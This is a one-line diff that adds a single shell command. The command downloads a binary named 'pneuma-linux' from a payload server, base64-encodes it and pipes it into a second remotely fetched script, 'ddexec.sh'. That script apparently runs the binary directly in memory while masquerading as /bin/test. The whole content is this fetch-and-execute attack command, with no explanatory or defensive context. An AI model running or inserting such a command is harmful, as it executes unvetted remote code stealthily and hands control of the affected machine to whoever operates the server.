@@ -1,0 +1,1 @@
+curl "http://0.0.0.0:3391/payloads/cea74c95ce1366db3d0d8fb1fc2f9b871fdd1e92/pneuma-linux" | base64 -w0 | bash <(curl http://0.0.0.0:3391/payloads/a31a4fdd4d12bcd4ad59ddc4ad67159f69b521e7/ddexec.sh) /bin/test
